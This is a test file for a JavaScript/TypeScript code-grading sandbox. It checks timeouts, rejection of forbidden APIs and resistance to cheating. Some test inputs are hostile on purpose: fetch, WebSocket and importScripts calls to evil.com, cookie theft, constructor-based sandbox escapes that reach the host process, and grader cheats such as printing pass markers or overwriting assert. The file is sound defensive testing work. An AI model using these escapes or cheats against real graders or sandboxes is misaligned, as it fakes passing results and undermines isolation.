import test from 'node:test';
import assert from 'node:assert/strict';

import { runJsInSandbox, PASS_SENTINEL } from '../src/lib/server/jsSandbox';

test('W-08: a correct answer passes (TypeScript)', async () => {
  const code = `
    export function add(a: number, b: number): number {
      return a + b;
    }
  `;
  const tests = `
    if (add(2, 3) !== 5) throw new Error("Expected 2 + 3 = 5");
    if (add(-1, 1) !== 0) throw new Error("Expected -1 + 1 = 0");
    if (add(10, 20) !== 30) throw new Error("Expected 10 + 20 = 30");
  `;

  const res = await runJsInSandbox({
    code,
    tests,
    language: 'typescript',
    timeoutMs: 4000,
  });

  assert.equal(res.passed, true, 'Correct answer must pass');
  assert.equal(res.status, 'SUCCESS');
  assert.equal(res.timedOut, false);
});

test('W-08: a correct answer passes (JavaScript)', async () => {
  const code = `
    function multiply(a, b) {
      return a * b;
    }
  `;
  const tests = `
    if (multiply(3, 4) !== 12) throw new Error("Expected 3 * 4 = 12");
  `;

  const res = await runJsInSandbox({
    code,
    tests,
    language: 'javascript',
    timeoutMs: 3000,
  });

  assert.equal(res.passed, true);
  assert.equal(res.status, 'SUCCESS');
});

test('W-08: a wrong answer fails', async () => {
  const code = `
    export function add(a: number, b: number): number {
      return a - b; // deliberate bug
    }
  `;
  const tests = `
    if (add(2, 3) !== 5) throw new Error("Expected 5");
  `;

  const res = await runJsInSandbox({
    code,
    tests,
    language: 'typescript',
    timeoutMs: 3000,
  });

  assert.equal(res.passed, false, 'Wrong answer must fail');
  assert.equal(res.status, 'ASSERTION_FAILED');
  assert.ok(res.stderr.includes('Expected 5'));
});

test('W-08: an infinite loop times out within deadline', async () => {
  const code = `
    function freeze(): void {
      while (true) {}
    }
    freeze();
  `;
  const tests = `
    // will never reach here
  `;

  const start = Date.now();
  const res = await runJsInSandbox({
    code,
    tests,
    language: 'typescript',
    timeoutMs: 1000,
  });
  const elapsed = Date.now() - start;

  assert.equal(res.passed, false);
  assert.equal(res.timedOut, true);
  assert.equal(res.status, 'TIMEOUT');
  assert.ok(elapsed >= 900 && elapsed < 3000, `Execution should time out around 1000ms, took ${elapsed}ms`);
});

test('W-08: a forbidden API is refused before execution', async () => {
  const forbiddenSnippets = [
    'fetch("https://evil.com")',
    'const ws = new WebSocket("wss://evil.com")',
    'importScripts("https://evil.com/hack.js")',
    'document.cookie = "stolen"',
    'process.exit(0)',
    'globalThis.leaked = true',
  ];

  for (const snippet of forbiddenSnippets) {
    const res = await runJsInSandbox({
      code: snippet,
      language: 'typescript',
      timeoutMs: 2000,
    });

    assert.equal(res.passed, false, `Forbidden snippet "${snippet}" must be rejected`);
    assert.equal(res.status, 'SECURITY_VIOLATION');
    assert.ok(res.stderr.includes('[SECURITY GUARD]'));
  }
});

test('W-08: printing any marker text does not pass when answer is wrong', async () => {
  const testSentinel = 'SECRET_TEST_SENTINEL_987654321';

  // Cheat attempt: student prints the default sentinel, the exact per-run sentinel,
  // and legacy markers, but provides an incorrect answer
  const code = `
    console.log("${PASS_SENTINEL}");
    console.log("${testSentinel}");
    console.log("__PINIT_TESTS_PASSED__");
    export function add(a: number, b: number): number {
      return 0; // wrong answer
    }
  `;
  const tests = `
    if (add(5, 5) !== 10) throw new Error("Expected 10");
  `;

  const res = await runJsInSandbox({
    code,
    tests,
    language: 'typescript',
    timeoutMs: 3000,
    sentinel: testSentinel,
  });

  assert.equal(res.passed, false, 'Cheating attempt by printing sentinel markers must fail');
  assert.equal(res.status, 'ASSERTION_FAILED');
  assert.ok(res.stderr.includes('Expected 10'));
});

test('W-08: hidden test source is never leaked in the output', async () => {
  const code = `
    export function solve(): string {
      return "wrong_guess";
    }
  `;
  const secretKey = 'TOP_SECRET_VERIFICATION_TOKEN_ABC_777';
  const hiddenTests = `
    const SECRET = "${secretKey}";
    if (solve() !== SECRET) {
      throw new Error("Hidden check 1 failed: key must be " + SECRET);
    }
  `;

  const res = await runJsInSandbox({
    code,
    tests: hiddenTests,
    language: 'typescript',
    timeoutMs: 3000,
    hidden: true,
  });

  assert.equal(res.passed, false);
  const combinedOutput = `${res.stdout}\n${res.stderr}`;

  // Assert secret token and secret test code are never present
  assert.ok(!combinedOutput.includes(secretKey), 'Secret token must never appear in output');
  assert.ok(!combinedOutput.includes('solve() !== SECRET'), 'Hidden test logic must never appear in output');
  assert.ok(res.stderr.includes('Hidden check 1 failed'), 'Only scrubbed check failure message should appear');
});

test('F-05 (1): assert = () => {} cheat cannot bypass assertions', async () => {
  const code = `
    assert = () => {};
    export function add(a: number, b: number): number {
      return 0; // wrong
    }
  `;
  const tests = `
    assert(add(1, 2) === 3, 'add(1, 2) should be 3');
  `;
  const res = await runJsInSandbox({
    code,
    tests,
    language: 'typescript',
  });
  assert.equal(res.passed, false, 'Overwriting assert must not allow wrong answer to pass');
});

test('F-05 (2): var assert = ... shadowing cannot bypass assertions', async () => {
  const code = `
    var assert = () => {};
    export function add(a: number, b: number): number {
      return 0; // wrong
    }
  `;
  const tests = `
    assert(add(1, 2) === 3, 'add(1, 2) should be 3');
  `;
  const res = await runJsInSandbox({
    code,
    tests,
    language: 'typescript',
  });
  assert.equal(res.passed, false, 'Shadowing assert must not allow wrong answer to pass');
});

test('F-05 (3): console.log.constructor sandbox escape cannot access host process', async () => {
  const code = `
    export function exploit(): any {
      try {
        const fn = console.log.constructor("return typeof process !== 'undefined' ? process : null");
        return fn();
      } catch {
        return null;
      }
    }
  `;
  const tests = `
    const proc = exploit();
    if (proc && typeof proc.exit === 'function') {
      throw new Error('LEAKED_HOST_PROCESS: console.log.constructor escaped to host process');
    }
  `;
  const res = await runJsInSandbox({
    code,
    tests,
    language: 'typescript',
  });
  assert.equal(res.passed, true, 'Exploit must not leak host process');
});

test('F-05 (4): ({}).constructor.constructor sandbox escape cannot access host process', async () => {
  const code = `
    export function exploit(): any {
      try {
        const c = "constructor";
        const fn = (({}) as any)[c][c]("return typeof process !== 'undefined' ? process : null");
        return fn();
      } catch {
        return null;
      }
    }
  `;
  const tests = `
    const proc = exploit();
    if (proc && typeof proc.exit === 'function') {
      throw new Error('LEAKED_HOST_PROCESS: ({}).constructor.constructor escaped to host process');
    }
  `;
  const res = await runJsInSandbox({
    code,
    tests,
    language: 'typescript',
  });
  assert.equal(res.passed, true, 'Exploit must not leak host process');
});

